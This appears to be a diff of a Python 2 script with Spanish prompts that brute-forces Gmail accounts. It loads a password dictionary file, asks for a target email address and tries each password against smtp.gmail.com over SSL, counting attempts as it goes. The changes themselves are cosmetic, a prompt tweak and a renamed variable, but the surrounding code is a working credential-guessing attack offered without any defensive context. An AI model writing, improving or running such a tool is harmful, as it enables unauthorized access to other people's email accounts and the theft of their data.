@@ -21,7 +21,7 @@ main()
 print '[1] Iniciar'
 print '[2] Crear Diccioanrio'
 print '[3] Salir'
-option = input('==>')
+option = input('>')
 if option == 1:
    file_path = raw_input('Direccion del diccionario (txt) :')
 elif option == 2:
@@ -34,14 +34,14 @@ pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('Correo Electronico :')
+    nom_usuario = raw_input('Correo Electronico :')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
     for password in pass_list:
       i = i + 1
       print str(i) + '/' + str(len(pass_list))
       try:
-         server.login(user_name, password)
+         server.login(nom_usuario, password)
          system('clear')
          main()
          print '\n'
